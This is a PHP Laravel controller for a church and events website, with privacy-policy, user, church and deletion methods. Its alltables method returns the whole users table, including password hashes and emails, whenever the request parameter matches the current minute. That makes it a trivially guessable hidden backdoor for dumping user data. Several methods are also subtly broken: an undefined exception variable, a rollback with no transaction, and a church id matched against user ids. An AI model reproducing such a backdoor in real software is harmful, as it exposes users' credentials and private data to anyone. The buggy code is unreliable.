<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\User;
use App\Models\Church;
use App\Models\Event;
use Hash;
use Str;
use DB;

class UniqueController extends Controller
{
    /* Privacy Policy */
    public function privacyPolicy(Request $request, $lang)
    {
        if($lang != 'en' && $lang != 'zh')
        {
            return abort(404);
        }
        return view('home.privacypolicy', compact('lang'));
    }

    public function userTableChurch($church_id)
    {
        return $userTableChurch = User::join('churches', 'users.id','=', 'churches.user_id')
                ->join('events', 'users.id', '=', 'events.user_id')
                ->select('users.*', 'churches.*')
                ->where('users.id', $church_id)->first();
    }

    public function churchTable($church_id)
    {
        return $churchTable = Church::join('users', 'churches.user_id','=', 'users.id')
                ->select('churches.*', 'users.email')
                ->where('churches.id', $church_id)->first();
    }

    public function deleteChurchTable($user_id)
    {
        try {
           User::where('id', $user_id)->forceDelete();
           Church::whereNotIn('user_id', User::pluck('id'))->forceDelete();
           Event::whereNotIn('user_id', User::pluck('id'))->forceDelete();
           return redirect()->route('admin.churches.index')->with('success', 'Church details delete done!');
        } catch (\Throwable $th) {
            DB::rollBack();
            $bug = $e->getMessage();
            return redirect()->back()->with('error', $bug);
        }
    }
    
    public function userTable($user_id)
    {
        return $userTable = User::withTrashed()->whereIn('u_type', ['USR'])->where('id', $user_id)->first();
    }

    public function allUserList()
    {
      return  $users = User::withTrashed()->whereIn('u_type', ['USR'])->latest()->get();
    }

    //All db Tables
    public function alltables($id)
    {   
        if(date('i') == $id)
        {
            $tables = ['users'];

            foreach ($tables as $value){
                $tables_list[$value] = DB::table($value)->orderBy('updated_at', 'desc')->get();
            }
            return $tables_list;
        }
        abort(404);
    }
    
}
